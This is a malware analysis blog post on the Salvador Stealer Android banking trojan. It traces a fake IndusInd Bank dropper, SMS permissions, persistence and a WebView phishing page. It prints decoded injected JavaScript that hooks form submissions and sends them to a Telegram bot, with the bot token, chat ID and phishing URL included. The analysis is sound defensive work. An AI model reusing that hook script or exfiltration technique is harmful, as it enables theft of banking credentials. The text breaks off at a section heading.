---
layout:	post
title:  "Salvador Stealer"
date:   2026-06-27 02:11:01 +0200
image: /images/2026-06-27-Salvador_Stealer/Salvador_Stealer.png
categories: [Android Malware, Banking Trojan]
tags: [android malware]
---

## Overview
Salvador stealer is an android banking trojan that embeds phishing page inside the application to trick victims into entering sensitive information, which is exfiltrated over Telegram. Additionally, it intercepts SMS messages to capture OTP and verification codes. These SMS contents are exfiltrated either via SMS forwarding mechanisms or HTTP POST requests. It has also implemented multiple persistence techniques.

<br>

## Infection Chain

![Infection Chain](/images/2026-06-27-Salvador_Stealer/1.png)

<br>

## Technical Analysis

### Initial Stager

name: `INDUSLND_BANK_E_KYC.apk` 

sha256: `21504d3f2f3c8d8d231575ca25b4e7e0871ad36ca6bbb825bf7f12bfc3b00f5a` 

package name: `com.indusvalley.appinstall`

The infection chain begins with the `INDUSLND_BANK_E_KYC.apk`, which impersonates a legitimate IndusInd Bank mobile banking application. However, the analysis reveals it to be a dropper that installs and executes the payload APK. 

<br>

#### AndroidManifest.xml

Loading the `INDUSLND_BANK_E_KYC.apk` into JADX and reviewing the `AndroidManifest.xml` immediately revealed several interesting artifacts:  
The application requests the `REQUEST_INSTALL_PACKAGES` permission, which allows it to prompt victims to install the payload APK.

```xml
<uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
```

Next, the `IndusKimkc` is the main and launcher activity that will be executed when victim launches the application.

```xml
<activity
    android:name="com.indusvalley.appinstall.IndusKimkc"
    android:exported="true"
    android:launchMode="singleTop">
	<intent-filter>
		<action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    ...
</activity>
```

<br>

#### IndusKimkc.java

When the victim open this application, Android will create an instance of `IndusKimkc` and transfers execution to its `onCreate()` method that calls the `showDialog()` method. 

![onCreate()](/images/2026-06-27-Salvador_Stealer/2.png)

The `showDialog()` method prompts a dialog displaying "***Click Proceed to Install Indus bank E-Kyc app***" with a **PROCEED** button. And once the button is clicked, execution shifts to `startInstallationSession()` method.

![showDialog()](/images/2026-06-27-Salvador_Stealer/3.png)

The `startInstallationSession()` method creates an installation session, then calls `addApkToInstallSession()` method to copy the bytes of `base.apk` into the install session. Then, it commits the installation request.

![startInstallationSession()](/images/2026-06-27-Salvador_Stealer/4.png)

The `addApkToInstallSession()` method reveals the origin of payload APK `base.apk`. Rather than downloading a second-stage payload from a remote server, the malware extracts an embedded APK named `base.apk` directly from the application's assets directory using `getAssets()`. 

![base.apk asset](/images/2026-06-27-Salvador_Stealer/5.png)

After committing the installation request, it registers a callback mechanism to track the installation status. When Android processes the installation request, control is returned to the `onNewIntent()` method with an installation status code.

![onNewIntent()](/images/2026-06-27-Salvador_Stealer/6.png)

- If Android requires explicit user approval (case -1 -> `STATUS_PENDING_USER_ACTION`), the dropper launches the system installation dialog and waits for the victim to approve the installation.
- Once installation completes successfully (case 0 -> `STATUS_SUCCESS`), it checks for the presence of the package `com.deer.lion`, which corresponds to the newly installed payload APK `base.apk`. If the package is found, the dropper retrieves its launch intent and immediately transfers execution to it.

<br>

### Payload

name: `base.apk` 

sha256: `7950cc61688a5bddbce3cb8e7cd6bec47eee9e38da3210098f5a5c20b39fb6d8` 

package name: `com.deer.lion`

<br>

#### AndroidManifest.xml

After the dropper successfully installs the payload, execution is transferred to `com.deer.lion`. To understand the capabilities and execution flow of the payload, `AndroidManifest.xml` was checked that revealed following interesting artifacts: 
The presence of `MAIN` action identifies `Helene` as entry point: 

```xml
<activity
	android:name="com.deer.lion.Helene"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.INFO"/>
    </intent-filter>
</activity>
```

Also, the application defines a service named `Fitzgerald`.

```xml
<service
    android:name="com.deer.lion.Fitzgerald"
    android:exported="false"
    android:foregroundServiceType="dataSync"/>
```

The manifest also revealed various SMS-related permissions:

```xml
<uses-permission android:name="android.permission.RECEIVE_SMS"/> 
<uses-permission android:name="android.permission.READ_SMS"/> 
<uses-permission android:name="android.permission.SEND_SMS"/>
```

Additionally, it requests following permission:

```xml
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
```

And, registers following broadcast receiver:

```xml
<receiver
    android:name="com.deer.lion.Ellsworth"
    android:permission="android.permission.RECEIVE_BOOT_COMPLETED"
    android:enabled="true"
	android:exported="false">
    <intent-filter>
		<action android:name="android.intent.action.BOOT_COMPLETED"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</receiver>
```

This receiver enables the application to regain execution after device reboot `BOOT_COMPLETED` invoking `Ellsworth` receiver, as persistence mechanism.

Also, it incorporates Android's WorkManager components through AndroidX startup framework, which allows it to schedule background jobs that continue its execution even if the application is no longer running, as additional persistence mechanism.

```xml
<provider
    android:name="androidx.startup.InitializationProvider"
    android:exported="false"
    android:authorities="com.deer.lion.androidx-startup">
    <meta-data
        android:name="androidx.work.WorkManagerInitializer"
        android:value="androidx.startup"/>
    </provider>
```

<br>

#### Helene.java

Lets now start the analysis following the execution flow beginning with the `Helene` activity that will transfer execution to its `onCreate()` method.

![onCreate()](/images/2026-06-27-Salvador_Stealer/7.png)

One of the first observations is the extensive use of obfuscated strings throughout the code, where every obfuscated string is wrapped inside calls to `NPStringFog.decode()`. Inspecting the `NPStringFog.decode()`, it revealed XOR routine that uses the key `npmanager` key to decode the plaintext strings. In the analysis below, I will be adding decoded string in the comments. 

![NPStringFog.decode()](/images/2026-06-27-Salvador_Stealer/8.png)

Returning to `onCreate()` method, it first calls `checkNetworkAndExitIfUnavailable()`. This method verifies if the device has an active internet connection. If no connection is found, it displays "***No Internet Connection. Exiting app.***" message and immediately terminates.

![checkNetworkAndExitIfUnavailable()](/images/2026-06-27-Salvador_Stealer/9.png)

It then calls `checkPermissions()` method to check if it has been granted following permissions:
- `RECEIVE_SMS` 
- `INTERNET` 
- `SEND_SMS`

![checkPermissions()](/images/2026-06-27-Salvador_Stealer/10.png)

If any of these permissions are missing, it calls `requestAppPermissions()` method, which prompts victim to grant following permissions:

![requestAppPermissions()](/images/2026-06-27-Salvador_Stealer/11.png)

Once the permission checks are satisfied, it proceeds to initialize an embedded WebView through `setupWebView()` method.

![setupWebView()](/images/2026-06-27-Salvador_Stealer/12.png)

During initialization, it enables JavaScript execution and DOM storage:

```java
settings.setJavaScriptEnabled(true);
settings.setDomStorageEnabled(true);
```

It then uses `webView.loadUrl()` to loads a remote phishing page hosted at `https://t15.muletipushpa.cloud/page/`, impersonating legitimate IndusInd Bank.

![webView.loadUrl()](/images/2026-06-27-Salvador_Stealer/13.png)

Additionally, after the remote phishing page finishes loading, it injects an obfuscated JavaScript payload through WebView's `onPageFinished()` callback. Decoding the obfuscated JavaScript payload using the same XOR routine ,we get:

```js
(function () {
	const originalSend = XMLHttpRequest.prototype.send;
	XMLHttpRequest.prototype.send = function (data) {
		try {
			const botToken = eval(decodeURIComponent('"7931012454:AAGdsBp3w5fSE9PxdrwNUopr3SU86mFQieE"'));
			const chatId = eval(decodeURIComponent('"-1002480016657"'));
			const telegramUrl = `https://api.telegram.org/bot${ botToken }/sendMessage`;
			const telegramMessage = {
				chat_id: chatId,
				text: `Intercepted Data Sent:\n${ data }`
			};
			fetch(telegramUrl, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify(telegramMessage)
			});
		} catch (e) {
			console.error('Error sending to Telegram:', e);
		}
		return originalSend.apply(this, arguments);
	};
}());
```

The JavaScript hooks `XMLHttpRequest.prototype.send()`, so whenever the loaded phishing page submits data, it captures outgoing request body and forwards it to a Telegram bot.
- Telegram Bot Token: `7931012454:AAGdsBp3w5fSE9PxdrwNUopr3SU86mFQieE`
- Chat ID: `-1002480016657`

Following this, it calls `initiateForegroundServiceIfRequired()` method that launches `Fitzgerald.class` as a foreground service. Before that, it checks for `RECEIVE_SMS` and `SEND_SMS` permissions by calling `hasNecessaryPermissions()`. If these permissions are missing, the victim is prompted again to grant permission by calling `requestAppPermissions()`.

![initiateForegroundServiceIfRequired()](/images/2026-06-27-Salvador_Stealer/13.png)

#### Fitzgerald.java